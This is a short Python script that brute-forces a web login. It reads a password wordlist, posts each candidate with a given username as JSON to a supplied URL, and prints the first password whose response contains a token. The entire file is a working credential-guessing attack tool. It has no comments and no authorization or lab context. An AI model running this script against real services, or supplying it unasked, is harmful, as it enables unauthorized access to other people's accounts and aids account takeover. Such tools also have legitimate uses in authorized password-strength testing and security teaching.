import sys
import requests
import json

if len(sys.argv) !=4:
    print(f"{sys.argv[0]} <url> <username> <passlist.txt>")
    sys.exit(1)

url = sys.argv[1]
username = sys.argv[2]
passlist = sys.argv[3]

with open(passlist, 'r') as infile:
    for line in infile:
        password = line.strip()
        print(f"using: {password}")

        response = requests.post(
            url,
            headers={'Content-Type': 'application/json'},
            data=json.dumps({"username":username, "password":password})
        )

        if "token" in response.text.lower():
            print(f"valid pass: {username} {password}")
            print(response.text)
            sys.exit(1)
        else:
            print(response.text)
print("no correct credentials found")